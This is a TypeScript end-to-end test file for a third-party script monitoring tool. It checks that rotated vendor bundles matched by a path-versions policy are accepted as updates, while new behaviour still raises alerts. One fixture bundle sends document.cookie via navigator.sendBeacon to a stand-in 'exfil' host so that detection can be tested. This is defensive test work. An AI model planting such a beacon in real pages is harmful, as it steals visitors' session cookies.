import { readFile } from 'node:fs/promises';
import { join } from 'node:path';
import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from 'vitest';
import { FixtureServer } from '../fixtures/server.js';
import { makeProject } from '../helpers.js';
import { main } from '../../src/cli/index.js';
import type { AnalysisReport } from '../../src/types/report.js';

/**
 * End-to-end: a vendor ships a new hash-named bundle on every release. With a path-versions policy
 * the rotation is one accepted update (no new + removed pair), yet new behaviour still alerts.
 */

const server = new FixtureServer();
let dir = '';
let cleanup: () => Promise<void> = () => Promise.resolve();

function bundleUrl(hash: string): string {
  return `http://cdn.vendor-a.test:${server.port}/sdk/v3/main.${hash}.js`;
}

function serveBundle(hash: string, body: string, previous?: string): void {
  if (previous) server.routes.delete(`cdn.vendor-a.test/sdk/v3/main.${previous}.js`);
  server.js('cdn.vendor-a.test', `/sdk/v3/main.${hash}.js`, body);
  server.html('shop.test', '/', `<!doctype html><html><head><title>Shop</title><script src="${bundleUrl(hash)}"></script></head><body><h1>Shop</h1></body></html>`);
}

async function cli(...args: string[]): Promise<{ code: number; stdout: string }> {
  const chunks: string[] = [];
  const spy = vi.spyOn(process.stdout, 'write').mockImplementation((chunk: string | Uint8Array) => {
    chunks.push(typeof chunk === 'string' ? chunk : Buffer.from(chunk).toString());
    return true;
  });
  try {
    const code = await main(['node', 'thirdsentry', '--config', join(dir, 'thirdsentry.yml'), ...args]);
    return { code, stdout: chunks.join('') };
  } finally {
    spy.mockRestore();
    process.exitCode = undefined;
  }
}

async function report(): Promise<AnalysisReport> {
  return JSON.parse(await readFile(join(dir, '.thirdsentry', 'reports', 'report.json'), 'utf8')) as AnalysisReport;
}

beforeAll(async () => {
  await server.start();
  serveBundle('aaaa1111', 'window.VendorSdk = { build: 1 };\n');
  server.set('exfil.vendor-e.test', '/c', { status: 204, headers: { 'access-control-allow-origin': '*' } });
  const project = await makeProject(server.port, {
    sites: [{ name: 'shop', url: `http://shop.test:${server.port}/`, pages: ['/'] }],
    scriptPolicies: [
      {
        name: 'vendor-sdk',
        match: { urlPrefix: `http://cdn.vendor-a.test:${server.port}/sdk/v3/` },
        mode: 'path-versions',
        reason: 'Vendor ships hash-named bundles on every release',
        owner: 'web-platform',
      },
    ],
    retention: { storeScriptContent: true },
    failOn: 'none',
  });
  dir = project.dir;
  cleanup = project.cleanup;
}, 60_000);

afterAll(async () => {
  await cleanup();
  await server.stop();
});

afterEach(() => {
  process.exitCode = undefined;
});

describe('path-versions policy end to end', () => {
  it('baselines the script under the policy identity', async () => {
    expect((await cli('scan', '--allow-missing-baseline')).code).toBe(0);
    expect((await cli('baseline', '--yes', '--reason', 'initial review')).code).toBe(0);
    const baseline = JSON.parse(await readFile(join(dir, '.thirdsentry', 'baselines', 'shop', 'baseline.json'), 'utf8')) as { resources: Array<{ identity: string }> };
    expect(baseline.resources.map((r) => r.identity)).toEqual(['policy:vendor-sdk']);
  }, 120_000);

  it('a rotated, differently named bundle is one accepted update, not a new + removed pair', async () => {
    serveBundle('bbbb2222', 'window.VendorSdk = { build: 2 };\n', 'aaaa1111');
    const r = await cli('scan', '--fail-on', 'low');
    const rep = await report();
    expect(rep.findings.map((f) => f.kind)).toEqual(['policy-accepted-update']);
    expect(rep.findings[0]?.severity).toBe('info');
    expect(rep.findings[0]?.policy?.name).toBe('vendor-sdk');
    expect(r.code).toBe(0);
    expect(rep.policies?.active.map((p) => p.name)).toEqual(['vendor-sdk']);
    expect(rep.policies?.unused).toEqual([]);
    expect(rep.policies?.matches[0]?.resource).toContain('main.bbbb2222.js');
  }, 120_000);

  it('diff shows which policy matched each resource', async () => {
    const r = await cli('diff');
    expect(r.stdout).toContain('Policy matches');
    expect(r.stdout).toMatch(/main\.bbbb2222\.js\s+->\s+policy vendor-sdk \(path-versions\)/);
  });

  it('new behaviour and a new outbound domain in a rotated bundle still alert', async () => {
    serveBundle('cccc3333', `window.VendorSdk = { build: 3 };\nnavigator.sendBeacon('http://exfil.vendor-e.test:${server.port}/c', document.cookie);\n`, 'bbbb2222');
    const r = await cli('scan', '--fail-on', 'medium');
    const rep = await report();
    const update = rep.findings.find((f) => f.kind === 'policy-accepted-update');
    expect(update?.signals.some((s) => s.id === 'new-rule:TS-BEACON')).toBe(true);
    expect(update?.severity).not.toBe('info');
    expect(update?.policy?.name).toBe('vendor-sdk');
    expect(rep.findings.some((f) => f.kind === 'new-outbound-domain' && f.domain === 'vendor-e.test')).toBe(true);
    expect(rep.findings.some((f) => f.kind === 'resource-added' || f.kind === 'resource-removed')).toBe(false);
    expect(r.code).toBe(1);
  }, 120_000);

  it('approving the finding approves the policy identity', async () => {
    const rep = await report();
    const update = rep.findings.find((f) => f.kind === 'policy-accepted-update');
    const ok = await cli('baseline', '--approve', update?.id ?? '', '--yes', '--reason', 'reviewed build 3');
    expect(ok.code).toBe(0);
    const after = JSON.parse((await cli('--json', 'diff')).stdout) as AnalysisReport;
    expect(after.findings.some((f) => f.kind === 'policy-accepted-update')).toBe(false);
    expect(after.findings.some((f) => f.kind === 'new-outbound-domain')).toBe(true);
  }, 120_000);
});
